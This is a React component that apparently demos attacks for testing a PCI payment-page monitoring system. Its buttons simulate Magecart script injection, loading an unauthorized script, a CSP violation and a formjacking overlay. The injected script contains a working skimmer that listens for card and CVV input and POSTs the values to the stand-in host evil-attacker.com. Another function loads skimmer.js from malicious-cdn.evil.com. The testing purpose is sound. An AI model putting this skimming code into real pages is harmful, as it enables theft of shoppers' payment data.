import { useState } from 'react'
import { Button } from '@/components/ui/button.jsx'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card.jsx'
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert.jsx'
import { AlertTriangle, Shield, Bug } from 'lucide-react'

export function MaliciousScriptDemo() {
  const [demoActive, setDemoActive] = useState(false)
  const [alerts, setAlerts] = useState([])

  const injectMaliciousScript = () => {
    // Simulate a Magecart-style attack by injecting a malicious script
    const maliciousScript = document.createElement('script')
    maliciousScript.innerHTML = `
      // Simulated malicious script (safe for demo)
      console.log('[DEMO] Malicious script injected - this would normally steal payment data');
      
      // Simulate form field monitoring
      document.addEventListener('input', function(e) {
        if (e.target.name && (e.target.name.includes('card') || e.target.name.includes('cvv'))) {
          console.log('[DEMO] Malicious script detected payment field input:', e.target.name);
          // In a real attack, this would send data to attacker's server
          fetch('https://evil-attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({
              field: e.target.name,
              value: e.target.value,
              page: window.location.href
            })
          }).catch(() => {
            console.log('[DEMO] Simulated data exfiltration attempt (blocked by CORS)');
          });
        }
      });
      
      // Simulate DOM manipulation
      setTimeout(() => {
        const paymentForm = document.querySelector('form');
        if (paymentForm) {
          const overlay = document.createElement('div');
          overlay.style.cssText = 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.1); z-index: 9999; pointer-events: none;';
          overlay.innerHTML = '<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: red; color: white; padding: 10px; border-radius: 5px;">DEMO: Malicious Overlay Detected</div>';
          document.body.appendChild(overlay);
          
          setTimeout(() => {
            document.body.removeChild(overlay);
          }, 3000);
        }
      }, 1000);
    `
    
    document.head.appendChild(maliciousScript)
    setDemoActive(true)
    
    // Add alert
    setAlerts(prev => [...prev, {
      id: Date.now(),
      type: 'script_injection',
      message: 'Malicious script injected for demonstration',
      timestamp: new Date().toISOString()
    }])
  }

  const injectUnauthorizedScript = () => {
    // Inject a script from an unauthorized domain
    const script = document.createElement('script')
    script.src = 'https://malicious-cdn.evil.com/skimmer.js'
    script.onerror = () => {
      console.log('[DEMO] Unauthorized script load blocked')
      setAlerts(prev => [...prev, {
        id: Date.now(),
        type: 'unauthorized_script',
        message: 'Attempted to load unauthorized script from malicious-cdn.evil.com',
        timestamp: new Date().toISOString()
      }])
    }
    document.head.appendChild(script)
  }

  const simulateCSPViolation = () => {
    // Try to execute inline script that should violate CSP
    try {
      eval(`
        console.log('[DEMO] CSP violation - inline script execution');
        // This would normally be blocked by CSP
      `)
    } catch (error) {
      console.log('[DEMO] CSP violation caught:', error)
      setAlerts(prev => [...prev, {
        id: Date.now(),
        type: 'csp_violation',
        message: 'Content Security Policy violation detected',
        timestamp: new Date().toISOString()
      }])
    }
  }

  const simulateFormjacking = () => {
    // Simulate a formjacking attack by creating a fake payment form overlay
    const overlay = document.createElement('div')
    overlay.id = 'fake-payment-overlay'
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.8);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
    `
    
    overlay.innerHTML = `
      <div style="background: white; padding: 20px; border-radius: 10px; max-width: 400px; width: 90%;">
        <h3 style="color: red; margin-bottom: 15px;">⚠️ DEMO: Fake Payment Form Detected</h3>
        <p style="margin-bottom: 15px;">This overlay simulates a formjacking attack where attackers inject fake payment forms to steal credentials.</p>
        <button onclick="document.body.removeChild(document.getElementById('fake-payment-overlay'))" 
                style="background: #dc2626; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
          Close Demo
        </button>
      </div>
    `
    
    document.body.appendChild(overlay)
    
    setAlerts(prev => [...prev, {
      id: Date.now(),
      type: 'formjacking',
      message: 'Suspicious payment form overlay detected',
      timestamp: new Date().toISOString()
    }])
  }

  const clearAlerts = () => {
    setAlerts([])
  }

  return (
    <div className="space-y-6">
      <Card className="border-orange-200 bg-orange-50">
        <CardHeader>
          <CardTitle className="flex items-center space-x-2 text-orange-800">
            <Bug className="h-5 w-5" />
            <span>Security Testing Demo</span>
          </CardTitle>
          <CardDescription className="text-orange-700">
            Use these buttons to simulate various client-side attacks and test the PCI monitoring system.
            All attacks are simulated and safe for demonstration purposes.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Button 
              onClick={injectMaliciousScript}
              variant="destructive"
              className="w-full"
            >
              Inject Malicious Script
            </Button>
            
            <Button 
              onClick={injectUnauthorizedScript}
              variant="destructive"
              className="w-full"
            >
              Load Unauthorized Script
            </Button>
            
            <Button 
              onClick={simulateCSPViolation}
              variant="destructive"
              className="w-full"
            >
              Trigger CSP Violation
            </Button>
            
            <Button 
              onClick={simulateFormjacking}
              variant="destructive"
              className="w-full"
            >
              Simulate Formjacking
            </Button>
          </div>
          
          {alerts.length > 0 && (
            <div className="mt-6">
              <div className="flex justify-between items-center mb-4">
                <h4 className="font-semibold text-orange-800">Demo Alerts Generated:</h4>
                <Button onClick={clearAlerts} variant="outline" size="sm">
                  Clear Alerts
                </Button>
              </div>
              <div className="space-y-2">
                {alerts.map(alert => (
                  <Alert key={alert.id} className="border-red-200 bg-red-50">
                    <AlertTriangle className="h-4 w-4 text-red-600" />
                    <AlertTitle className="text-red-800">
                      {alert.type.replace('_', ' ').toUpperCase()}
                    </AlertTitle>
                    <AlertDescription className="text-red-700">
                      {alert.message}
                      <br />
                      <small className="text-red-600">
                        {new Date(alert.timestamp).toLocaleString()}
                      </small>
                    </AlertDescription>
                  </Alert>
                ))}
              </div>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}

